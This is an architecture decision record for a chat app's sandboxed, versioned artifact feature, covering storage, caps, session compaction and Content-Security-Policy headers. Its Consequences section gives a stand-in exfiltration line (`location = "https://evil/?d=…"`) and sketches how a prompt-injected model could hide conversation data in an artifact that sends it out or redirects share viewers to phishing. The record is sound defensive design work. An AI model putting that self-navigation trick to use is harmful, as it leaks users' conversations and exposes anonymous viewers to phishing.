---
id: 0084
date: 2026-10-03
status: accepted
tags: [artifacts, tools, frontend, share-links, security, csp, sandbox, egress, session-size, storage]
supersedes: []
amends: [0004, 0013, 0021, 0035]
---

# Model-created, versioned artifacts, served under a CSP sandbox header and compacted out of the session

## Context
The user wants a Claude Artifacts / ChatGPT Canvas equivalent: substantial model output (an HTML page or small
app, an SVG, a long markdown document, a code file) that opens beside the chat, with versions, and that public
share links show too. Phase 1 (ADR 0083) shipped the shared renderer this reuses. Two forces dominate. First, the
tool-call ARGUMENTS carry the whole source and stay in the 2 MB session item (ADR 0004). Second, model-written
HTML must never run on the app origin with the user's Easy Auth session.

## Decision
- **Three tools under one selectable key `artifacts`:** `create_artifact(kind, title, content, language?)`,
  `update_artifact(artifactId, content, title?)` and `read_artifact(artifactId, version?)`. The kinds are `html`,
  `svg`, `markdown` and `code`. Every update is a new full version, and edits are model-only (no in-pane editor).
- **Storage:** bytes go to blob storage through `IAttachmentStore`, always as `application/octet-stream`. Metadata
  is `AgentGrainState.Artifacts` (`[Id(15)]`), persisted by the end-of-turn write, never by the tool.
- **Caps (`ArtifactLimits`):** 64 KB per version, 20 versions per artifact, 20 artifacts per conversation. Over-cap
  content is refused, never truncated.
- **Session size, branch (a) of the plan: compaction.** At the three post-turn persist sites, beside retention,
  `CompactArtifactCalls` replaces each create/update call's `content` argument, and each `read_artifact` result,
  with a stub (`[stored as artifact {id} v{n}; call read_artifact to see it]`). The tools refuse content that
  starts with the stub prefix.
- **Serving:** `/api/conversations/{c}/artifacts[/{a}/versions/{n}/content|frame]`, plus `/api/share/{token}/…`
  twins. Every response carries `Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src
  'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'unsafe-inline' https://cdnjs.cloudflare.com; img-src
  data: blob:; font-src data: https://cdnjs.cloudflare.com; media-src data: blob:; connect-src 'none'; form-action
  'none'; base-uri 'none'; frame-ancestors 'self'`, plus nosniff, `Referrer-Policy: no-referrer` and
  `Cache-Control: private, no-store`. `/content` is always `text/plain`. `/frame` serves html and svg only (svg
  wrapped in a minimal page). The pane loads it in `<iframe sandbox="allow-scripts">`.
- **UI:** a shared classic script `src/Agent42.Backend/wwwroot/shared/lib/artifactpane.js`, used by the app (via `src/Agent42.Backend/wwwroot/js/artifacts.js`) and the
  viewer. Cards come from `ChatTurn.Artifacts`, projected from the turn's tool calls and kept by the share response,
  and from the live `toolCallEnd`. The pane also lists the conversation's artifacts from state.

## Alternatives considered
- **(b) A cumulative per-conversation artifact budget instead of compaction.** This was the fallback if the spike
  failed. It lost because the spike passed on Agent Framework 1.22: a replaced `FunctionCallContent` survives
  serialize → JSON → deserialize, and the next turn still pairs the call with its result (60 603 → 630 bytes for
  one 60 KB call). A budget would have ended long artifact conversations for no reason.
- **A chat-client reducer (the ADR 0082 shape) that trims what is SENT.** It lost because it fixes token cost but
  not the 2 MB stored item.
- **Relying on the iframe `sandbox` attribute alone.** Rejected: anyone can open `/frame` as a top-level page,
  where the attribute does not exist, and the model's script would run on `chat.agent42.nl` with the session. That
  is stored XSS reachable by prompt injection. The header gives an opaque origin either way.
- **Storing artifact blobs with their real media type.** Rejected: both attachment proxies serve any id under the
  owner key with its stored type and no CSP. A `text/html` blob would render on the app origin, for anonymous share
  visitors too. Both proxies now also send nosniff.
- **A separate artifact origin (sandbox subdomain).** Not taken: it needs DNS, certificates and a second Easy Auth
  story for one user. The CSP `sandbox` header already yields an opaque origin.
- **Dropping the cdnjs allowance (fully self-contained artifacts).** User decision, 2026-10-03: keep it, so an
  artifact can load a charting or 3D library.
- **Allowing artifacts in incognito chats (the image precedent).** Rejected: an artifact is model-authored
  conversation content written to blob with no purge path, which breaks ADR 0034. The tools refuse.

## Consequences
- **ADR 0013 extension: there is a real egress path, and it is accepted (user decision, 2026-10-03).** A sandboxed
  document can still navigate ITSELF (`location = "https://evil/?d=…"`, a meta refresh, an auto-clicked link). CSP
  `navigate-to` exists in no browser, and the sandbox flags do not stop self-navigation. A prompt-injected model
  can therefore write conversation content into an artifact that ships it out when the pane opens, or when a public
  share viewer loads it. That viewer is anonymous, so the same channel can redirect them to a phishing page. The
  cdnjs allowance also lets any cdnjs-hosted script gadget run, though still inside the sandbox. Nothing here
  claims that no content leaves.
- **Cookie-bearing same-origin GETs (measured, 2026-10-03).** An opaque-origin frame cannot READ the app, but its
  self-navigation to a same-origin GET still carries the Easy Auth cookie, while `form-action 'none'` stops POSTs.
  Every authenticated GET (29 `MapGet` routes) was reviewed for side effects:
  - `/api/mcp/oauth/callback` takes the pending state from the user's own grain. A forged call on DevHost returned
    `302 → /?mcp_oauth=error&reason=unknown_state` and changed nothing.
  - `/api/mcp/oauth/start?serverId=…` acts only on the user's own InteractiveOAuth server (unknown id → `404`). At
    worst it records a pending state and may register a junk client at that provider (dynamic client
    registration), then redirects the frame to the provider's login page, which needs user interaction.
  - `/searxng/*` can run a search (an egress already accepted in ADR 0059).
  - Every other GET is a read, and the frame cannot read its response.
  - No harmful GET was found. A future GET with a side effect inherits this exposure, which is the reason for the
    gotcha.
- **ADR 0035 extension: share links publish scriptable HTML** from the app origin to anonymous visitors, sandboxed
  as above. A share is a live view, so the share routes serve every artifact and version in the conversation's
  state, including ones from later turns.
- **ADR 0021:** the `artifacts` key lands OFF for anyone who ever pressed Save. A null binding (stored agents with
  no tool list, `/api/agent-run`, MCP-server consumers) gets it ON. Their artifacts are viewable in that
  conversation, and the tool descriptions promise no pane. A loop-enabled stored agent may create duplicates per
  iteration (out of scope).
- **ADR 0004:** compaction is the first mutation of tool-call content at the persist sites. It is idempotent and
  joins results by `CallId`. `ArtifactUpdates_DoNotBlowTheSessionSizeBudget` pins it: 11 × 60 KB versions plus a
  read stay under 64 KB of session.
- `PurgeAsync` clears the metadata, but the blobs stay, the same gap attachments have.
- Cards can vanish from history with their tool messages (a chain open at a user turn, `StripToolHistory`,
  retention). The pane's "Artifacts in this chat" list reads state, and the chat app's topbar Artifacts button
  (`#artifactsBtn`, shown when `/artifacts` is non-empty) opens the pane on that list without a card, so no
  artifact becomes unreachable. The list inside the pane alone was not enough: the pane opened only from a card.
- Out of scope, and next: in-pane editing and diff-style updates (phase 3), offline artifacts, closing the
  self-navigation channel (impossible with browser primitives).
- Spec: `.agentic/specs/completed/plan-artifact-pane.md`.
